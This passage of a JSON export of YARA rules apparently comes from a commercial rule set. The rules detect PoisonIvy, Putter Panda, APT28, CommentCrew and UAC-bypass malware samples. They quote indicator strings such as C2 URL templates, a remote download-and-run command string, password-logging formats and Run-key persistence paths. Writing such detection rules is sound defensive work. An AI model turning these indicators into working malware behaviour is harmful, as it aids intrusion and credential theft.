\"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\ctfmon.tmp\" fullword ascii\n      $s2 = \"\\\\temp\\\\ctfmon.tmp\" fullword ascii\n      $s3 = \"SOFTWARE\\\\Classes\\\\http\\\\shell\\\\open\\\\commandV\" fullword ascii\n      $s4 = \"CONNECT %s:%i HTTP/1.0\" fullword ascii\n      $s5 = \"start read histry key\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"%s\\\"; filename=\\\"%s\\\"\" fullword ascii\n      $s7 = \"[password]%s\" fullword ascii\n      $s8 = \"Daemon.dll\" fullword ascii\n      $s9 = \"[username]%s\" fullword ascii\n      $s10 = \"advpack\" fullword ascii\n      $s11 = \"%s%2.2X\" fullword ascii\n      $s12 = \"advAPI32\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 8 of ( $s* ) ) or ( 1 of ( $z* ) and 3 of ( $s* ) )\n}","date":"2015-06-03 10:59:41","description":"Detects PoisonIvy RAT sample set","minimum_yara":"1.7","name":"PoisonIvy_Sample_6_RID2E17","reference":"VT Analysis","required_modules":[],"rule_hash":"8d96097435d40c03eb06faf0fc66c1fc","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_PSAPI_RID31C1 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a malware related to Putter Panda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LOADER ERROR\" fullword ascii\n      $s1 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s2 = \"psapi.dll\" fullword ascii\n      $s3 = \"urlmon.dll\" fullword ascii\n      $s4 = \"WinHttpGetProxyForUrl\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-03 13:36:01","description":"Detects a malware related to Putter Panda","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_PSAPI_RID31C1","reference":"VT Analysis","required_modules":[],"rule_hash":"756ceadee9087abddcefa10d379fe73e","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_WUAUCLT_RID3269 : APT CHINA DEMO MAL {\n   meta:\n      description = \"Detects a malware related to Putter Panda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 14:04:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"WUAUCLT.EXE\" fullword wide\n      $x1 = \"%s\\\\tmp%d.exe\" fullword ascii\n      $x2 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s1 = \"Microsoft Windows Operating System\" fullword wide\n      $s2 = \"InternetQueryOptionA\" fullword ascii\n      $s3 = \"LookupPrivilegeValueA\" fullword ascii\n      $s4 = \"WNetEnumResourceA\" fullword ascii\n      $s5 = \"HttpSendRequestExA\" fullword ascii\n      $s6 = \"PSAPI.DLL\" fullword ascii\n      $s7 = \"Microsoft(R) Windows(R) Operating System\" fullword wide\n      $s8 = \"CreatePipe\" fullword ascii\n      $s9 = \"EnumProcessModules\" fullword ascii\n   condition: \n      all of ( $x* ) or ( 1 of ( $x* ) and all of ( $s* ) )\n}","date":"2015-06-03 14:04:01","description":"Detects a malware related to Putter Panda","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_WUAUCLT_RID3269","reference":"VT Analysis","required_modules":[],"rule_hash":"036c84b599ab24a61b602c9435f936db","score":70,"tags":["APT","DEMO","CHINA","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_7_RID2E18 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s2 = \"pidll.dll\" fullword ascii\n      $s10 = \"ServiceMain\" fullword ascii\n      $s11 = \"ZwSetInformationProcess\" fullword ascii\n      $s12 = \"Software installation Service\" fullword wide\n      $s13 = \"Microsoft(R) Windows(R) Operating System\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-03 10:59:51","description":"Detects PoisonIvy RAT sample set","minimum_yara":"1.7","name":"PoisonIvy_Sample_7_RID2E18","reference":"VT Analysis","required_modules":[],"rule_hash":"1fa64afa8039473aa7d78c09185d4dcf","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_Gen1_RID318F : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a malware \"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-06-03 13:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s%duserid=%dthreadid=%dgroupid=%d\" fullword ascii\n      $s2 = \"ssdpsvc.dll\" fullword ascii\n      $s3 = \"Fail %s \" fullword ascii\n      $s4 = \"%s%dpara1=%dpara2=%dpara3=%d\" fullword ascii\n      $s5 = \"LsaServiceInit\" fullword ascii\n      $s6 = \"%-8d Fs %-12s Bs \" fullword ascii\n      $s7 = \"Microsoft DH SChannel Cryptographic Provider\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them\n}","date":"2015-06-03 13:27:41","description":"Detects a malware ","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_Gen1_RID318F","reference":"not set","required_modules":[],"rule_hash":"d6393b376fd3295f10921be72475846a","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Malware_MsUpdater_String_in_EXE_RID331B : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"MSUpdater String in Executable\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 14:33:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"msupdate.exe\" fullword wide\n      $x3 = \"msupdater.exe\" fullword ascii\n      $x4 = \"msupdater32.exe\" fullword ascii\n      $x5 = \"msupdater32.exe\" fullword wide\n      $x6 = \"msupdate.pif\" fullword ascii\n      $fp1 = \"_msupdate_\" wide\n      $fp2 = \"_msupdate_\" ascii\n      $fp3 = \"/kies\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) ) and not ( 1 of ( $fp* ) )\n}","date":"2015-06-03 14:33:41","description":"MSUpdater String in Executable","minimum_yara":"1.7","name":"Malware_MsUpdater_String_in_EXE_RID331B","reference":"VT Analysis","required_modules":[],"rule_hash":"66f32a4600929b84ebcfffc8a06d1f2d","score":60,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_MsUpdater_3_RID346B : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msupdater.exe\" fullword ascii\n      $s1 = \"Explorer.exe \\\"\" fullword ascii\n      $s2 = \"FAVORITES.DAT\" fullword ascii\n      $s4 = \"COMSPEC\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 3 of them\n}","date":"2015-06-03 15:29:41","description":"Detects Malware related to PutterPanda - MSUpdater","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_MsUpdater_3_RID346B","reference":"VT Analysis","required_modules":[],"rule_hash":"aa99b02760344bafd1edc132a8e809ec","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_MsUpdater_1_RID3469 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"msupdate.exe\" fullword wide\n      $x1 = \"msupdate\" fullword wide\n      $s1 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s2 = \"Automatic Updates\" fullword wide\n      $s3 = \"VirtualProtectEx\" fullword ascii\n      $s4 = \"Invalid parameter\" fullword ascii\n      $s5 = \"VirtualAllocEx\" fullword ascii\n      $s6 = \"WriteProcessMemory\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) and 4 of ( $s* ) ) or ( 1 of ( $x* ) and all of ( $s* ) )\n}","date":"2015-06-03 15:29:21","description":"Detects Malware related to PutterPanda - MSUpdater","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_MsUpdater_1_RID3469","reference":"VT Analysis","required_modules":[],"rule_hash":"62f69d46210e12fe401e56f901fdb5af","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_MsUpdater_2_RID346A : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"winsta0\\\\default\" fullword ascii\n      $s1 = \"EXPLORER.EXE\" fullword ascii\n      $s2 = \"WNetEnumResourceA\" fullword ascii\n      $s3 = \"explorer.exe\" fullword ascii\n      $s4 = \"CreateProcessAsUserA\" fullword ascii\n      $s5 = \"HttpSendRequestExA\" fullword ascii\n      $s6 = \"HttpEndRequestA\" fullword ascii\n      $s7 = \"GetModuleBaseNameA\" fullword ascii\n      $s8 = \"GetModuleFileNameExA\" fullword ascii\n      $s9 = \"HttpSendRequestA\" fullword ascii\n      $s10 = \"HttpOpenRequestA\" fullword ascii\n      $s11 = \"InternetConnectA\" fullword ascii\n      $s12 = \"Process32Next\" fullword ascii\n      $s13 = \"Process32First\" fullword ascii\n      $s14 = \"CreatePipe\" fullword ascii\n      $s15 = \"EnumProcesses\" fullword ascii\n      $s16 = \"LookupPrivilegeValueA\" fullword ascii\n      $s17 = \"PeekNamedPipe\" fullword ascii\n      $s18 = \"EnumProcessModules\" fullword ascii\n      $s19 = \"PSAPI.DLL\" fullword ascii\n      $s20 = \"SPSSSQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}","date":"2015-06-03 15:29:31","description":"Detects Malware related to PutterPanda - MSUpdater","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_MsUpdater_2_RID346A","reference":"VT Analysis","required_modules":[],"rule_hash":"87e2474c8bf0220c02a57dd0f01c5c3a","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_Gen4_RID3192 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Malware related to PutterPanda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:28:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rz.dat\" fullword ascii\n      $s0 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n      $s1 = \"Internet connect error:%d\" fullword ascii\n      $s2 = \"Proxy-Authorization:Basic \" fullword ascii\n      $s5 = \"Invalid url\" fullword ascii\n      $s6 = \"Create file failed\" fullword ascii\n      $s7 = \"myAgent\" fullword ascii\n      $z1 = \"%s%s%d%d\" fullword ascii\n      $z2 = \"HttpQueryInfo failed:%d\" fullword ascii\n      $z3 = \"read file error:%d\" fullword ascii\n      $z4 = \"down file success\" fullword ascii\n      $z5 = \"kPStoreCreateInstance\" fullword ascii\n      $z6 = \"Avaliable data:%u bytes\" fullword ascii\n      $z7 = \"abe2869f-9b47-4cd9-a358-c22904dba7f7\" fullword ascii\n   condition: \n      filesize < 300KB and ( ( uint16 ( 0 ) == 0x5a4d and $x1 and 3 of ( $s* ) ) or ( 3 of ( $s* ) and 4 of ( $z* ) ) )\n}","date":"2015-06-03 13:28:11","description":"Detects Malware related to PutterPanda","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_Gen4_RID3192","reference":"VT Analysis","required_modules":[],"rule_hash":"4602e2bbe8b06d4adb03123a5db0a1eb","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule APT_Malware_CommentCrew_MiniASP_RID32B1 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"CommentCrew Malware MiniASP APT\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 14:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\MiniAsp4\\\\Release\\\\MiniAsp.pdb\" ascii\n      $x2 = \"run http://%s/logo.png setup.exe\" fullword ascii\n      $x3 = \"d:\\\\command.txt\" fullword ascii\n      $z1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR \" ascii\n      $z2 = \"Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)\" fullword ascii\n      $z3 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC\" ascii\n      $s1 = \"http://%s/device_command.asp?device_id=%s&cv=%s&command=%s\" fullword ascii\n      $s2 = \"kill process error!\" fullword ascii\n      $s3 = \"kill process success!\" fullword ascii\n      $s4 = \"pickup command error!\" fullword ascii\n      $s5 = \"http://%s/record.asp?device_t=%s&key=%s&device_id=%s&cv=%s&result=%s\" fullword ascii\n      $s6 = \"no command\" fullword ascii\n      $s7 = \"software\\\\microsoft\\\\windows\\\\currentversion\\\\run\" fullword ascii\n      $s8 = \"command is null!\" fullword ascii\n      $s9 = \"pickup command Ok!\" fullword ascii\n      $s10 = \"http://%s/result_%s.htm\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) or ( all of ( $z* ) ) or ( 8 of ( $s* ) )\n}","date":"2015-06-03 14:16:01","description":"CommentCrew Malware MiniASP APT","minimum_yara":"1.7","name":"APT_Malware_CommentCrew_MiniASP_RID32B1","reference":"VT Analysis","required_modules":[],"rule_hash":"a3b714945a91061a9f3c15dca27f652d","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT28_CHOPSTICK_RID2B67 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects a malware that behaves like CHOPSTICK mentioned in APT28 report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/v3ebal\"\n      date = \"2015-06-02 09:05:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"jhuhugit.tmp\" fullword ascii\n      $s8 = \"KERNEL32.dll\" fullword ascii\n      $s9 = \"IsDebuggerPresent\" fullword ascii\n      $s10 = \"IsProcessorFeaturePresent\" fullword ascii\n      $s11 = \"TerminateProcess\" fullword ascii\n      $s13 = \"DeleteFileA\" fullword ascii\n      $s15 = \"GetProcessHeap\" fullword ascii\n      $s16 = \"!This program cannot be run in DOS mode.\" fullword ascii\n      $s17 = \"LoadLibraryA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 722KB and all of them\n}","date":"2015-06-02 09:05:01","description":"Detects a malware that behaves like CHOPSTICK mentioned in APT28 report","minimum_yara":"1.7","name":"APT28_CHOPSTICK_RID2B67","reference":"https://goo.gl/v3ebal","required_modules":[],"rule_hash":"7cce8362c5381282c0df3eb6c3eb9156","score":60,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT28_SourFace_Malware1_RID2F30 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword wide\n      $s1 = \"Core Shell Runtime Service\" fullword wide\n      $s2 = \"\\\\chkdbg.log\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them\n}","date":"2015-06-01 11:46:31","description":"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.","minimum_yara":"1.7","name":"APT28_SourFace_Malware1_RID2F30","reference":"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html","required_modules":[],"rule_hash":"02aedce037d2125858f8e19dd988556d","score":60,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule APT28_SourFace_Malware2_RID2F31 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword ascii\n      $s1 = \"Applicate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}","date":"2015-06-01 11:46:41","description":"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.","minimum_yara":"1.7","name":"APT28_SourFace_Malware2_RID2F31","reference":"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html","required_modules":[],"rule_hash":"05b146ef78dc991baee4121b4c702c3b","score":60,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule APT28_SourFace_Malware3_RID2F32 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword wide\n      $s1 = \"Core Shell Runtime Service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}","date":"2015-06-01 11:46:51","description":"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.","minimum_yara":"1.7","name":"APT28_SourFace_Malware3_RID2F32","reference":"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html","required_modules":[],"rule_hash":"178a2c12a1bac4d04c92fae9f90f159c","score":60,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule DarkEYEv3_Cryptor_RID2D71 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Rule to detect DarkEYEv3 encrypted executables (often malware)\"\n      author = \"Florian Roth\"\n      reference = \"http://darkeyev3.blogspot.fi/\"\n      date = \"2015-05-24 10:32:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\DarkEYEV3-\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s0\n}","date":"2015-05-24 10:32:01","description":"Rule to detect DarkEYEv3 encrypted executables (often malware)","minimum_yara":"1.7","name":"DarkEYEv3_Cryptor_RID2D71","reference":"http://darkeyev3.blogspot.fi/","required_modules":[],"rule_hash":"0dbe69f1711caa056c04ea022a2f94d8","score":55,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SVG_LoadURL_RID2AD3 : DEMO EXPLOIT {\n   meta:\n      description = \"Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/psjCCc\"\n      date = \"2015-05-24 08:43:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"</svg>\" nocase\n      $s2 = \"<script>\" nocase\n      $s3 = \"location.href='http\" nocase\n   condition: \n      all of ( $s* ) and filesize < 600\n}","date":"2015-05-24 08:43:21","description":"Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)","minimum_yara":"1.7","name":"SVG_LoadURL_RID2AD3","reference":"http://goo.gl/psjCCc","required_modules":[],"rule_hash":"297f927a2adf5cf789f789d3f8802876","score":50,"tags":["EXPLOIT","DEMO"]},{"author":"Florian Roth","content":"rule MAL_PoisonIvy_Generic_3_RID2FA8 : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"PoisonIvy RAT Generic Rule\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-05-14 12:06:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $k1 = \"Tiger324{\" fullword ascii\n      $s2 = \"WININET.dll\" fullword ascii\n      $s3 = \"mscoree.dll\" fullword wide\n      $s4 = \"WS2_32.dll\" fullword\n      $s5 = \"Explorer.exe\" fullword wide\n      $s6 = \"USER32.DLL\" \n      $s7 = \"CONOUT$\" \n      $s8 = \"login.asp\" \n      $h1 = \"HTTP/1.0\" \n      $h2 = \"POST\" \n      $h3 = \"login.asp\" \n      $h4 = \"check.asp\" \n      $h5 = \"result.asp\" \n      $h6 = \"upload.asp\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $k1 or all of ( $s* ) or all of ( $h* ) )\n}","date":"2015-05-14 12:06:31","description":"PoisonIvy RAT Generic Rule","minimum_yara":"1.7","name":"MAL_PoisonIvy_Generic_3_RID2FA8","reference":"-","required_modules":[],"rule_hash":"d328e9cfec40ad7165205c45f75f6a98","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule UACME_Akagi_RID2AB8 : DEMO HKTL MAL T1088 {\n   meta:\n      description = \"Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/hfiref0x/UACME\"\n      date = \"2015-05-14 07:58:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, MAL, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UACMe injected, Fubuki at your service.\" wide fullword\n      $x3 = \"%temp%\\\\Hibiki.dll\" fullword wide\n      $x4 = \"[UCM] Cannot write to the target process memory.\" fullword wide\n      $s1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n      $s2 = \"D:(A;;GA;;;WD)\" wide\n      $s3 = \"%systemroot%\\\\system32\\\\sysprep\\\\sysprep.exe\" fullword wide\n      $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\" fullword wide\n      $s5 = \"Fubuki.dll\" ascii fullword\n      $l1 = \"ntdll.dll\" ascii\n      $l2 = \"Cabinet.dll\" ascii\n      $l3 = \"GetProcessHeap\" ascii\n      $l4 = \"WriteProcessMemory\" ascii\n      $l5 = \"ShellExecuteEx\" ascii\n   condition: \n      ( 1 of ( $x* ) ) or ( 3 of ( $s* ) and all of ( $l* ) )\n}","date":"2015-05-14 07:58:21","description":"Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor","minimum_yara":"1.7","name":"UACME_Akagi_RID2AB8","reference":"https://github.com/hfiref0x/UACME","required_modules":[],"rule_hash":"f38734da4427adc7679421863eb9810f","score":50,"tags":["MAL","DEMO","T1088","HKTL"]},{"author":"Florian Roth","content":"rule UACElevator_RID2B2C : DEMO EXE FILE HKTL T1088 {\n   meta:\n      description = \"UACElevator_RID2B2C bypassing UAC - file UACElevator_RID2B2C.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/MalwareTech/UACElevator_RID2B2C\"\n      date = \"2015-05-14 08:55:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\UACElevator_RID2B2C.pdb\" ascii\n      $s1 = \"%userprofile%\\\\Downloads\\\\dwmapi.dll\" fullword ascii\n      $s2 = \"%windir%\\\\system32\\\\dwmapi.dll\" fullword ascii\n      $s3 = \"Infection module: %s\" fullword ascii\n      $s4 = \"Could not save module to %s\" fullword ascii\n      $s5 = \"%s%s%p%s%ld%s%d%s\" fullword ascii\n      $s6 = \"Stack area around _alloca memory reserved by this function is corrupted\" fullword ascii\n      $s7 = \"Stack around the variable '\" fullword ascii\n      $s8 = \"MSVCR120D.dll\" fullword wide\n      $s9 = \"Address: 0x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 172KB and ( $x1 or 8 of ( $s* ) )\n}","date":"2015-05-14 08:55:11","description":"UACElevator bypassing UAC - file UACElevator.exe","minimum_yara":"1.7","name":"UACElevator_RID2B2C","reference":"https://github.com/MalwareTech/UACElevator","required_modules":[],"rule_hash":"f7be5a94c923e915ba6adb5346f171a3","score":50,"tags":["DEMO","EXE","T1088","FILE","HKTL"]},{"author":"Florian Roth","content":"rule APT17_Sample_FXSST_DLL_RID2E51 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Samples related to APT17 activity - file FXSST.DLL\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/ZiJyQv\"\n      date = \"2015-05-14 11:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Microsoft? Windows? Operating System\" fullword wide\n      $x2 = \"fxsst.dll\" fullword ascii\n      $y1 = \"DllRegisterServer\" fullword ascii\n      $y2 = \".cSV\" fullword ascii\n      $s1 = \"GetLastActivePopup\" \n      $s2 = \"Sleep\" \n      $s3 = \"GetModuleFileName\" \n      